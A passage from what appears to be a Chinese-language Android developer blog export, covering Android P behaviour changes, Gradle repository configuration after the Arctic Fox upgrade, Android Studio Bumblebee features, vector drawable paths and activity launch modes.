<h4 id="窗口变更详情"><a href="#窗口变更详情" class="headerlink" title="窗口变更详情"></a>窗口变更详情</h4><p>Android P 让您可以在应用同时重绘多个窗口时，更轻松地跟踪应用窗口的更新。 当发生 TYPE_WINDOWS_CHANGED 事件时，可使用 getWindowChanges() API 来确定窗口发生的变更。 现在，在多窗口更新期间，每个窗口都会生成自己的一组事件。 getSource() 函数返回与每个事件相关联的窗口的根视图。</p>
<p>如果应用已为其 View 对象定义无障碍功能窗格标题，您的 Service 将可以识别应用界面何时进行更新。 当发生 TYPE_WINDOW_STATE_CHANGED 事件时，可使用 getContentChangeTypes() 所返回的新类型来确定窗口发生的变更。 例如，框架现在可以检测窗格何时有新标题或者窗格何时消失。</p>
<h4 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h4><p>为避免无意的旋转，我们新增了一个模式，哪怕设备位置发生变化，也会固定在当前屏幕方向上。 必要时用户可以通过按系统栏上的一个新增按钮手动触发旋转。</p>
<p>在大多数情况下，对应用的兼容性影响应该微不足道。 不过，如果您的应用有任何自定义旋转行为，或使用了任何机密的屏幕方向设置，则可能会遇到以前用户旋转首选项始终设置为纵向时被忽视的问题。 我们鼓励您审视一下您的应用所有关键 Activity 中的旋转行为，并确保您的所有屏幕方向设置仍可提供最佳体验。</p>
<p>一个新的旋转模式允许用户在必要时利用系统栏上的一个按钮手动触发旋转。 </p>
<h4 id="内置-QR-码库"><a href="#内置-QR-码库" class="headerlink" title="内置 QR 码库"></a>内置 QR 码库</h4><p>Android P 自行捆绑了一个 QR 码库，以精简 QR 码设备配置。 IT 管理员不再需要手动输入 Wi-Fi 详细信息来设置设备。 从 Android P 开始，可在 QR 码内包含这些 Wi-Fi 详细信息。 当 IT 管理员使用公司所有的设备扫描 QR 码时，设备会自动连接到 Wi-Fi 并进入配置流程，无需任何额外的手动输入。</p>
<h4 id="后台应用中的输入和数据隐私"><a href="#后台应用中的输入和数据隐私" class="headerlink" title="后台应用中的输入和数据隐私"></a>后台应用中的输入和数据隐私</h4><p>Android P 通过限制后台应用访问用户输入和传感器数据的能力增强了隐私性。 如果您的应用在运行 Android P 的设备上在后台运行，系统将对您的应用施加以下限制：</p>
<ul>
<li>您的应用不能访问麦克风或摄像头。</li>
<li>使用连续报告模式的传感器（例如加速度计和陀螺仪）不会接收事件。</li>
<li>使用发送变化时或一次性报告模式的传感器不会接收事件。</li>
</ul>
<p>如果您的应用需要在运行 Android P 的设备上检测传感器事件，请使用前台服务。</p>
<p>注：对 SensorManager 的某个实例调用 flush() 的应用不会受此变更影响。</p>
<h4 id="加密变更"><a href="#加密变更" class="headerlink" title="加密变更"></a>加密变更</h4><p>Android P 针对加密算法的实现和处理引入了几项变更。<br>参数和算法的 Conscrypt 实现</p>
<p>Android P 在 Conscrypt 中实现了更多的算法参数{: .external-link}。 这些参数包括： AES、DESEDE、OAEP 和 EC。 这些参数和许多算法的 Bouncy Castle 版本{: .external-link} 在 Android P 中已被弃用。</p>
<p>注：EC 参数的 Conscrypt 实现仅支持已命名的曲线。</p>
<p>如果您的应用以 Android 8.1（API 级别 27）或更低版本为目标，则在请求上述已弃用算法的 Bouncy Castle 实现时，您将收到一条警告消息。 然而，如果您以 Android P 为目标，则这些请求会各自引发 NoSuchAlgorithmException。</p>
<p>Android P 引入了其他几项加密变更：</p>
<ul>
<li>使用 PBE 密钥时，如果 Bouncy Castle 需要初始化矢量 (IV)，而您的应用未提供 IV，则会收到一条警告消息。</li>
<li>ARC4 加密的 Conscrypt 实现允许您指定 ARC4/ECB/NoPadding 或 ARC4/NONE/NoPadding。</li>
<li>Crypto Java 加密架构 (JCA) 提供程序现已被移除。 因此，如果您的应用调用 SecureRandom.getInstance(“SHA1PRNG”, “Crypto”)，将会发生 NoSuchProviderException。</li>
<li>如果您的应用从大于密钥结构的缓冲区中解析 RSA 密钥，将不会再发生异常。</li>
</ul>
<h4 id="Java-UTF-解码器"><a href="#Java-UTF-解码器" class="headerlink" title="Java UTF 解码器"></a>Java UTF 解码器</h4><p>UTF-8 是 Android 中的默认字符集。 UTF-8 字节序列可由 String(byte[] bytes) 之类的 String 构造函数解码。 Android P 中的 UTF-8 解码器更严格，其遵循 Unicode 标准，也即：</p>
<ul>
<li>非最短形式的 UTF-8（例如 &lt;C0, AF&gt;）现在被视为格式不正确。</li>
<li>替代形式的 UTF-8（例如 U+D800..U+DFFF）现在被视为格式不正确。</li>
<li>最大的子部分被单个 U+FFFD 取代。 例如，在字节序列“41 C0 AF 41 F4 80 80 41”中，最大子部分为“C0”、“AF”和“F4 80 80”。其中“F4 80 80”可以是“F4 80 80 80”的初始子序列，但“C0”不能是任何形式正确的代码单位序列的初始子序列。 因此，输出应为“A\ufffd\ufffdA\ufffdA”。</li>
<li>要在 Android P 中解码修改后的 UTF-8/CESU-8 序列，请使用 DataInputStream.readUTF() 函数或 NewStringUTF() JNI 函数。</li>
</ul>
<h4 id="套接字标记"><a href="#套接字标记" class="headerlink" title="套接字标记"></a>套接字标记</h4><p>在 Android P 以前的平台版本上，如果使用 setThreadStatsTag() 函数标记某个套接字，则当使用带 ParcelFileDescriptor 容器的 binder IPC 将其发送给其他进程时，套接字会被取消标记。</p>
<p>从 Android P 开始，利用 binder IPC 将套接字发送至其他进程时，其标记将得到保留。 此变更可能影响网络流量统计，例如，使用queryDetailsForUidTag() 函数时。 您可以通过先调用 untagSocket() 然后再将套接字发送至其他进程，保留以前的行为。</p>
<p>在调用 shutdownInput() 函数后调用 available() 函数会返回 0。</p>
<h4 id="现在，强制执行-FLAG-ACTIVITY-NEW-TASK-要求"><a href="#现在，强制执行-FLAG-ACTIVITY-NEW-TASK-要求" class="headerlink" title="现在，强制执行 FLAG_ACTIVITY_NEW_TASK 要求"></a>现在，强制执行 FLAG_ACTIVITY_NEW_TASK 要求</h4><p>在 Android P 中，您不能从非 Activity 环境中启动 Activity，除非您传递 Intent 标志 FLAG_ACTIVITY_NEW_TASK。 如果您尝试在不传递此标志的情况下启动 Activity，则该 Activity 不会启动，系统会在日志中输出一则消息。</p>
<p>注：在 Android N 之前，标志要求一直是期望的行为并被强制执行。 Android N 中的一个错误会临时阻止实施标志要求。</p>
<h4 id="屏幕旋转变更"><a href="#屏幕旋转变更" class="headerlink" title="屏幕旋转变更"></a>屏幕旋转变更</h4><p>Android O 中的用户可以使用 Quicksettings 图块或 Display 设置在自动屏幕旋转和纵向旋转模式之间切换。 Android P 对纵向旋转模式做出了重大变更。 纵向模式已重命名为旋转锁定，它会在自动屏幕旋转关闭时启用。 自动屏幕旋转模式没有任何变更。</p>
<p>当设备处于旋转锁定模式时，用户可将其屏幕锁定到顶层可见 Activity 所支持的任何旋转。 Activity 不应假定它将始终以纵向呈现。 如果顶层 Activity 可在自动屏幕旋转模式下以多种旋转呈现，则应在旋转锁定模式下提供相同的选项，根据 Activity 的 screenOrientation 设置，允许存在一些例外情况（见下表）。</p>
<p>请求特定屏幕方向（例如，screenOrientation=landscape）的 Activity 会忽略用户锁定首选项，并且行为与 Android O 中的行为相同。</p>
<p>可在 Android 清单中，或以编程方式通过 setRequestedOrientation()，在 Activity 一级设置屏幕方向首选项。</p>
<p>旋转锁定模式通过设置 WindowManager 在处理 Activity 旋转时使用的用户旋转首选项来发挥作用。 用户旋转首选项可能在下列情况下发生变更。 请注意，恢复纵向模式存在偏差：</p>
<ul>
<li>当用户接受旋转建议时，旋转首选项变为建议方向。</li>
<li>当用户切换到强制纵向应用（包括锁定屏幕或启动器）时，旋转首选项变为纵向。</li>
</ul>
<p>下表总结了常见屏幕方向的旋转行为:</p>
<blockquote>
<p>表格，看原文</p>
</blockquote>
<h4 id="完"><a href="#完" class="headerlink" title="完"></a>完</h4>]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android Studio Arctic Fox 版本升级补丁</title>
    <url>/Android/Android%20Studio%20Arctic%20Fox%20%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E8%A1%A5%E4%B8%81/</url>
    <content><![CDATA[<p>升级了Android Studio创建了一个新的新项目，添加aar库出现各种找不到库的问题。<br>版本信息如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Android Studio Arctic Fox | 2020.3.1</span><br><span class="line">Build #AI-203.7717.56.2031.7583922, built on July 27, 2021</span><br><span class="line">Runtime version: 11.0.10+0-b96-7249189 amd64</span><br><span class="line">VM: OpenJDK 64-Bit Server VM by Oracle Corporation</span><br><span class="line">Windows 10 10.0</span><br><span class="line">GC: G1 Young Generation, G1 Old Generation</span><br></pre></td></tr></table></figure></p>
<p>下面记录一下变动：</p>
<ol>
<li><p>repositories变动<br><code>/project/build.gradle</code> 内的 <code>allprojects</code> 节点移动到了 <code>/project/settings.gradle</code>，内容如下：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">dependencyResolutionManagement &#123;</span><br><span class="line">    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        jcenter() <span class="comment">// Warning: this repository is going to shut down soon</span></span><br><span class="line">        <span class="keyword">flatDir</span> &#123;</span><br><span class="line">            dirs <span class="string">'libs'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>libs目录变动<br>从以上flatDir配置看到，’libs’ 就是当前目录下的 libs 目录<br>libs目录默认由 <code>/project/module/libs</code> 改为 <code>/project/libs</code> 。<br>不设置flatDir，项目构建时会提示错误。</p>
</li>
</ol>
<hr>
<h3 id="1-旧版完整的代码："><a href="#1-旧版完整的代码：" class="headerlink" title="1. 旧版完整的代码："></a>1. 旧版完整的代码：</h3><ul>
<li><p><code>/project/build.gradle</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line"></span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        maven &#123; url &apos;https://jitpack.io&apos; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        classpath &apos;com.android.tools.build:gradle:4.2.1&apos;</span><br><span class="line">        classpath &quot;org.jetbrains.kotlin:kotlin-gradle-plugin:1.5.20&quot;</span><br><span class="line"></span><br><span class="line">        // NOTE: Do not place your application dependencies here; they belong</span><br><span class="line">        // in the individual module build.gradle files</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">        maven &#123; url &apos;https://jitpack.io&apos; &#125;</span><br><span class="line">        flatDir&#123;</span><br><span class="line">            dirs &apos;libs&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task clean(type: Delete) &#123;</span><br><span class="line">    delete rootProject.buildDir</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>/project/settings.gradle</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rootProject.name = &quot;appDemo&quot;</span><br><span class="line">include &apos;:app&apos;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-新版完整的代码："><a href="#2-新版完整的代码：" class="headerlink" title="2. 新版完整的代码："></a>2. 新版完整的代码：</h3><ul>
<li><p><code>/project/build.gradle</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line"></span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        maven &#123; url &apos;https://jitpack.io&apos; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        classpath &quot;com.android.tools.build:gradle:7.0.0&quot;</span><br><span class="line">        classpath &quot;org.jetbrains.kotlin:kotlin-gradle-plugin:1.5.20&quot;</span><br><span class="line"></span><br><span class="line">        // NOTE: Do not place your application dependencies here; they belong</span><br><span class="line">        // in the individual module build.gradle files</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task clean(type: Delete) &#123;</span><br><span class="line">    delete rootProject.buildDir</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>/project/settings.gradle</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dependencyResolutionManagement &#123;</span><br><span class="line">    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">        jcenter() // Warning: this repository is going to shut down soon</span><br><span class="line">        flatDir &#123;</span><br><span class="line">            dirs &apos;libs&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">rootProject.name = &quot;appDemo&quot;</span><br><span class="line">include &apos;:app&apos;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android Studio Bumblebee</title>
    <url>/Android/Android%20Studio%20Bumblebee/</url>
    <content><![CDATA[<h2 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h2><p>2022-02-09 当前版本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Android Studio Arctic Fox | 2020.3.1 Patch 4</span><br><span class="line">Build #AI-203.7717.56.2031.7935034, built on November 21, 2021</span><br><span class="line">Runtime version: 11.0.10+0-b96-7249189 amd64</span><br><span class="line">VM: OpenJDK 64-Bit Server VM by Oracle Corporation</span><br><span class="line">Windows 10 10.0</span><br><span class="line">GC: G1 Young Generation, G1 Old Generation</span><br><span class="line">Memory: 2280M</span><br><span class="line">Cores: 4</span><br><span class="line">Registry: external.system.auto.import.disabled=true</span><br><span class="line">Non-Bundled Plugins: wu.seal.tool.jsontokotlin</span><br></pre></td></tr></table></figure></p>
<p>点击 “检查更新” 升级到最新版本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The latest stable release of Android Studio is now available for download.</span><br><span class="line">Android Studio Bumblebee | 2021.1.1 Patch 1 is a major new release and includes performance improvements, bug fixes and new features.</span><br><span class="line">Intellij 2021.1.1 Platform Update</span><br><span class="line">New Device Manager</span><br><span class="line">ADB over Wi-Fi</span><br><span class="line">Run Instrumented Tests in Android Studio using Gradle</span><br><span class="line">Android Gradle Plugin Upgrade Assistant now updates API usage</span><br><span class="line">Non-Transitive R classes on for new projects</span><br><span class="line">Apple Silicon Support Update</span><br><span class="line">Jank detection track in Profilers</span><br><span class="line">Profileable app profiling support in Studio Profilers</span><br><span class="line">Network Inspection and ability to capture Layout Inspector snapshots</span><br><span class="line">Support for Compose semantics in the Layout Inspector</span><br><span class="line">Interactive Preview</span><br><span class="line">Animated Vector Drawables Preview</span><br><span class="line">Updated Device picker for Design Tools</span><br><span class="line">Important After updating, you need to restart Android Studio to apply any memory settings you migrate from an earlier version of the IDE.</span><br></pre></td></tr></table></figure></p>
<p>升级后版本信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Android Studio Bumblebee | 2021.1.1 Patch 1</span><br><span class="line">Build #AI-211.7628.21.2111.8139111, built on February 2, 2022</span><br><span class="line">Runtime version: 11.0.11+9-b60-7590822 amd64</span><br><span class="line">VM: OpenJDK 64-Bit Server VM by Oracle Corporation</span><br><span class="line">Windows 10 10.0</span><br><span class="line">GC: G1 Young Generation, G1 Old Generation</span><br><span class="line">Memory: 2280M</span><br><span class="line">Cores: 4</span><br><span class="line">Registry: external.system.auto.import.disabled=true</span><br><span class="line">Non-Bundled Plugins: wu.seal.tool.jsontokotlin (3.7.2), org.jetbrains.kotlin (211-1.6.10-release-923-AS7442.40)</span><br></pre></td></tr></table></figure></p>
<p>代号由 <code>Arctic Fox</code> 变成了 <code>Bumblebee</code>。</p>
<p>升级完成后，测试一下 project 构建会不会出现错误等问题。</p>
<h2 id="新功能说明："><a href="#新功能说明：" class="headerlink" title="新功能说明："></a>新功能说明：</h2><p>转自:<a href="https://developer.android.google.cn/studio/releases#bumblebee" target="_blank" rel="noopener">【Android Studio Bumblebee 是一个主要版本，包含各种新功能和改进】</a></p>
<h4 id="一、支持执行-KMP-测试"><a href="#一、支持执行-KMP-测试" class="headerlink" title="一、支持执行 KMP 测试"></a>一、支持执行 KMP 测试</h4><p>您可以从 Android Studio Bumblebee 针对 Kotlin Multiplatform (KMP) 项目运行测试。</p>
<p>为了确保您的测试能够从 Android Studio 成功运行，您必须满足以下所有要求：</p>
<ul>
<li>AGP 7.0.0-alpha08 或更高版本</li>
<li>Gradle 6.8.2 或更高版本。</li>
<li>Kotlin 插件 1.4.30 或更高版本</li>
</ul>
<h4 id="二、新的AVD设备管理器"><a href="#二、新的AVD设备管理器" class="headerlink" title="二、新的AVD设备管理器"></a>二、新的AVD设备管理器</h4><ul>
<li>一种更灵活的界面，支持停靠在 Android Studio 中、悬浮起来或以单独的窗口显示，就像其他 Android Studio 工具窗口一样。这样，您就可以更轻松地访问设备，而不会妨碍 Android Studio 的其他窗口。</li>
<li>一个 Virtual 标签页，可让您创建、管理和部署虚拟设备，一目了然地查看每个设备的详细信息，也可以直接在“设备文件浏览器”中一键检查设备。</li>
<li>一个 Physical 标签页，可让您使用 adb WiFi 快速与新设备配对，并一目了然地查看每个实体设备的详细信息。此外，您只需点击按钮，即可使用设备文件浏览器快速检查每台设备的文件系统。</li>
</ul>
<h4 id="三、布局检查器中的新功能"><a href="#三、布局检查器中的新功能" class="headerlink" title="三、布局检查器中的新功能"></a>三、布局检查器中的新功能</h4><h5 id="1-捕获布局层次结构快照"><a href="#1-捕获布局层次结构快照" class="headerlink" title="1. 捕获布局层次结构快照"></a>1. 捕获布局层次结构快照</h5><p>借助布局检查器，您现在可以保存正在运行应用的布局层次结构快照，以便轻松地与他人分享或日后查看。</p>
<p>快照会捕获您在使用布局检查器时通常看到的数据，包括布局的详细 3D 渲染、视图的组件树、Compose 或混合布局，以及界面每个组件的详细属性。如需保存快照，请执行以下操作：</p>
<ul>
<li>将您的应用部署到搭载 API 级别 23 或更高级别的设备中</li>
<li>依次选择 View &gt; Tool Windows &gt; Layout Inspector，打开布局检查器。</li>
<li>布局检查器应该会自动连接到您的应用进程。如果没有，请从下拉菜单中选择相应应用进程。</li>
<li>如果要捕获快照，请点击布局检查器工具栏中的 Export snapshot “导出”图标。</li>
<li>在出现的系统对话框中，指定快照的名称和保存位置。请务必以 *.li 扩展名保存文件。</li>
</ul>
<p>然后，您可以通过以下方式加载布局检查器快照：从主菜单栏中依次选择 File &gt; Open，然后打开 *.li 文件。</p>
<h5 id="2-支持检查-Compose-语义"><a href="#2-支持检查-Compose-语义" class="headerlink" title="2. 支持检查 Compose 语义"></a>2. 支持检查 Compose 语义</h5><p>在 Compose 中，Semantics 以无障碍服务和测试框架可以理解的替代方式描述您的界面。在 Android Studio Bumblebee 中，您现在可以使用布局检查器检查 Compose 布局中的语义信息。<br>选择 Compose 节点时，请使用 Attributes 窗口检查它是否直接声明语义信息以及/或者是否合并其子元素中的语义。要快速识别哪些节点包含已声明或合并的语义，请在 Component Tree 窗口中选择 View options 下拉菜单，然后选择 Highlight Semantics Layers。这样只会突出显示树中包括语义的节点，您可以使用键盘在节点之间快速导航。</p>
<h5 id="3-避免重启-Activity"><a href="#3-避免重启-Activity" class="headerlink" title="3. 避免重启 Activity"></a>3. 避免重启 Activity</h5><p>将布局检查器连接到旧版 Android Studio 上正在运行的应用会导致应用的 Activity 重启。设置设备标记以检查应用布局时，必须这样。</p>
<p>在 Android Studio Bumblebee 中，您可以通过以下任一步骤提前设置此标记，从而避免在连接布局检查器时重启 Activity：</p>
<p>启用 Run Configuration 选项</p>
<ul>
<li>从主菜单栏中依次选择 Run &gt; Edit Configurations。此时将显示运行/调试配置对话框。</li>
<li>转到要使用的运行配置。</li>
<li>在 Layout Inspector options 部分，选中 Connect to Layout Inspector without restarting activity 旁边的复选框。</li>
<li><p>下次要使用布局检查器检查应用时，请使用运行配置。<br>从命令行设置此标记：</p>
</li>
<li><p>在连接到设备的计算机上打开终端窗口</p>
</li>
<li>使用以下命令为您的应用设置设备标记：<br>  <code>adb shell settings put global debug_view_attributes_application_package &lt;my_package_name&gt;</code></li>
<li>将您的应用部署到设备并连接布局检查器。Android Studio 会检查该标记是否已设置，并尽可能避免重启 Activity。</li>
</ul>
<h5 id="4-文档布局检查器快照"><a href="#4-文档布局检查器快照" class="headerlink" title="4. 文档布局检查器快照"></a>4. 文档布局检查器快照</h5><p>您现在可以捕获应用布局层次结构的快照，以便保存、分享或日后检查。快照会捕获您在使用布局检查器时通常会看到的数据，包括布局的详细 3D 渲染、视图的组件树、Compose 或混合布局，以及每个界面组件的详细属性。检查正在运行的应用的布局时，点击布局检查器工具栏中的 Export snapshot 图标 “导出”图标，并以 <em>.li 扩展名的形式保存快照。然后，您可以通过以下方式加载布局检查器快照：从主菜单栏中依次选择 File &gt; Open，然后打开 </em>.li 文件。快照会显示在编辑器窗口的标签页中，便于您轻松将其与正在运行的应用进行比较。</p>
<h4 id="四、App-Inspection-中的新功能"><a href="#四、App-Inspection-中的新功能" class="headerlink" title="四、App Inspection 中的新功能"></a>四、App Inspection 中的新功能</h4><p>Android Studio Bumblebee 在 App Inspection 窗口中新增了一些工具和功能。您可以从主菜单栏中依次选择 View &gt; Tool Windows &gt; App Inspection，打开 App Inspector。</p>
<h5 id="1-Network-Inspector"><a href="#1-Network-Inspector" class="headerlink" title="1. Network Inspector"></a>1. Network Inspector</h5><p>Profilers 工具窗口中的网络性能分析器现已移至 App Inspection 工具窗口。如果您之前使用过网络性能分析器，则所有相同的功能和丰富的网络流量数据仍然可用。只需将您的应用部署到搭载 API 级别 26 及更高级别的设备上，然后依次打开 App Inspector &gt; Network Inspector 标签页即可。</p>
<h5 id="2-检查作业、警报和唤醒锁"><a href="#2-检查作业、警报和唤醒锁" class="headerlink" title="2. 检查作业、警报和唤醒锁"></a>2. 检查作业、警报和唤醒锁</h5><p>现在，除了支持检查工作器外，您还可以使用后台任务检查器检查应用的作业、警报和唤醒锁。现在，每种类型的异步任务都会显示在检查器标签页的相应标题下，便于您轻松监控其状态和进度。与工作器类似，您可以在 Task Details 面板中选择相应作业、警报或唤醒锁，以检查其详细信息。</p>
<blockquote>
<p>注意：此功能已从能耗性能分析器中迁出。因此，现在您应该使用后台任务检查器检查应用的所有异步任务。</p>
</blockquote>
<p>由于工作器在后台使用作业和唤醒锁，因此工作器调度的这些任务会显示为每个工作器的子级。请注意，您只能在图表模式下看到工作器。</p>
<h4 id="五、无线调试"><a href="#五、无线调试" class="headerlink" title="五、无线调试"></a>五、无线调试</h4><p>Android Studio Bumblebee 支持在搭载 Android 11 及更高版本的设备上使用无线调试功能。无需使用 USB 线或使用命令行管理 Android 调试桥 (adb) 连接，即可通过 Wi-Fi 从 Android Studio 配对和部署应用。如需使用此功能，请找到设备选择菜单中的 Pair devices using Wi-Fi 选项，并选择一个二维码或配对 PIN 码。然后，在 Android 11 及更高版本的设备上，在开发者选项下，找到无线调试屏幕，接着通过 Android Studio 初始化并与 adb 会话进行无线连接。如需详细了解无线调试设置，请参阅通过 Wi-Fi 连接到设备 (Android 11+)。</p>
<h4 id="六、默认启用-Compose-互动式预览"><a href="#六、默认启用-Compose-互动式预览" class="headerlink" title="六、默认启用 Compose 互动式预览"></a>六、默认启用 Compose 互动式预览</h4><p>从 Android Studio Bumblebee 开始，互动式预览功能默认处于启用状态。借助互动式预览，您可以与预览互动，就像在设备上操作一样。互动式预览处于沙盒环境中，并与其他预览相互隔离，您可以在其中点击元素并在预览中输入用户输入。通过这种模式，您可以快速测试可绘制项的不同状态和手势，例如勾选或清空复选框。</p>
<p>预览互动模式直接在 Android Studio 中运行，并未运行模拟器，因此存在一些限制：</p>
<ul>
<li>无法访问网络。</li>
<li>无法访问文件。</li>
<li>有些 Context API 不一定完全可用。</li>
</ul>
<h4 id="七、动画形式的矢量可绘制对象-AVD-预览"><a href="#七、动画形式的矢量可绘制对象-AVD-预览" class="headerlink" title="七、动画形式的矢量可绘制对象 (AVD) 预览"></a>七、动画形式的矢量可绘制对象 (AVD) 预览</h4><p>动画形式的矢量可绘制对象工具使您能够预览动画形式的可绘制资源。此工具可帮助您在 Android Studio 中预览 <code>&lt;animation-list&gt;</code>、<code>&lt;animated-vector&gt;</code> 和 <code>&lt;animated-selector&gt;</code> 资源，使您能够更轻松地优化自定义动画。</p>
<h4 id="八、非传递-R-类默认处于开启状态"><a href="#八、非传递-R-类默认处于开启状态" class="headerlink" title="八、非传递 R 类默认处于开启状态"></a>八、非传递 R 类默认处于开启状态</h4><p>非传递 R 类现在默认处于开启状态。可以将非传递 R 类与 Android Gradle 插件一起使用，以便为具有多个模块的应用构建更快的 build。这样做有助于确保每个模块的 R 类仅包含对其自身资源的引用，而不会从其依赖项中提取引用，从而帮助防止资源重复。这样可以获得较新的 build，以及避免编译的相应优势。</p>
<p>如需使用此功能，请依次转到 Refactor &gt; Migrate to Non-transitive R Classes…。</p>
<h4 id="九、Apple-Silicon-支持更新"><a href="#九、Apple-Silicon-支持更新" class="headerlink" title="九、Apple Silicon 支持更新"></a>九、Apple Silicon 支持更新</h4><p>对于在 Apple Silicon (arm64) 硬件上使用 macOS 的用户，自去年以来，Android Studio Arctic Fox 和 Android 模拟器已支持这种新架构。不过，在此版本中，我们已将 Android SDK 平台工具 v32.0.0（包含 adb 和 fastboot）和构建工具 v32.1.0（包含 aapt）更新为通用二进制文件，这样 Android 开发者工具不再需要 Rosetta 二进制转译器既可运行。请参阅 SDK 平台工具版本说明。</p>
<h4 id="十、更新了设计工具的设备选择器"><a href="#十、更新了设计工具的设备选择器" class="headerlink" title="十、更新了设计工具的设备选择器"></a>十、更新了设计工具的设备选择器</h4><p>为了简化针对各种 Android 设备设计应用的流程，我们在各种设计工具窗口（例如布局编辑器和布局验证）中更新了设备选择器，其中包含的参考设备能反映每种设备外形规格的热门尺寸。从手机到平板电脑，从 Wear 设备到 Android TV，您现在可以更轻松地在最能代表真实设备的设备屏幕上预览、验证或修改布局。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Android Vector两种形式</title>
    <url>/Android/Android%20Vector%E4%B8%A4%E7%A7%8D%E5%BD%A2%E5%BC%8F/</url>
    <content><![CDATA[<p>利用IDE内置的创建Android机器人默认路径如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;path</span><br><span class="line">    android:pathData=&quot;M17.6,11.48 L19.44,8.3a0.63,0.63 0,0 0,-1.09 -0.63l-1.88,3.24a11.43,11.43 0,0 0,-8.94 0L5.65,7.67a0.63,0.63 0,0 0,-1.09 0.63L6.4,11.48A10.81,10.81 0,0 0,1 20L23,20A10.81,10.81 0,0 0,17.6 11.48ZM7,17.25A1.25,1.25 0,1 1,8.25 16,1.25 1.25,0 0,1 7,17.25ZM17,17.25A1.25,1.25 0,1 1,18.25 16,1.25 1.25,0 0,1 17,17.25Z&quot;</span><br><span class="line">    android:fillColor=&quot;#FF000000&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/android/full_color.png" alt></p>
<p>填充色 fillColor 改为 线条 strokeColor，设置一下宽度为1，效果如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;path</span><br><span class="line">    android:pathData=&quot;M17.6,11.48 L19.44,8.3a0.63,0.63 0,0 0,-1.09 -0.63l-1.88,3.24a11.43,11.43 0,0 0,-8.94 0L5.65,7.67a0.63,0.63 0,0 0,-1.09 0.63L6.4,11.48A10.81,10.81 0,0 0,1 20L23,20A10.81,10.81 0,0 0,17.6 11.48ZM7,17.25A1.25,1.25 0,1 1,8.25 16,1.25 1.25,0 0,1 7,17.25ZM17,17.25A1.25,1.25 0,1 1,18.25 16,1.25 1.25,0 0,1 17,17.25Z&quot;</span><br><span class="line">    android:strokeWidth=&quot;1&quot;</span><br><span class="line">    android:strokeColor=&quot;#FF000000&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/android/stroke_color.png" alt></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Vector</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 启动模式备忘</title>
    <url>/Android/Android%20%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h3 id="1-standard-标准模式"><a href="#1-standard-标准模式" class="headerlink" title="1.standard 标准模式"></a>1.standard 标准模式</h3><p>每次启动都new一个实例</p>
<h3 id="2-singleTop-栈顶复用模式（栈顶单例模式）"><a href="#2-singleTop-栈顶复用模式（栈顶单例模式）" class="headerlink" title="2.singleTop 栈顶复用模式（栈顶单例模式）"></a>2.singleTop 栈顶复用模式（栈顶单例模式）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android:launchMode=&quot;singleTop&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果Activity实例处于任务栈栈顶，再启动相同的Activity不会new出一个实例，只会有一个实例。</li>
<li>如果Activity实例存在任务栈不处于栈顶，和<code>standard</code>一样new实例。</li>
</ul>
